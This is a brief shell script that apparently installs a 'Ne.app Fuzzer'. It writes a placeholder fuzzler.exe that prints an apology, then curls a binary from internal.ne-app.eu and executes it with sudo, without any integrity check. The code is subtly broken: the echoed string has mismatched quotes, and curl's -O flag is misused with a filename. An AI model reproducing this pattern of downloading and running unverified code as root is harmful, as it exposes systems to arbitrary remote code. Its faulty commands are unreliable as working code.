#! /bin/sh

echo "=> Downloading Ne.app Fuzzer..."

touch fuzzler.exe
echo "#! /bin/sh\nclear;\n\necho 'Fuzzer wasn't found on Ne.app servers, we are sorry for that.;\n\nexit 0;" > fuzzler.exe
chmod +x fuzzler.exe

# Now the actual binary. Download the fuzzler a tool used to fuzz data into a specific program using a specific protocol.
curl -fsSL https://internal.ne-app.eu/repo/nwk/fuzzler.exe -O fuzzler.exe
sudo ./fuzzler.exe
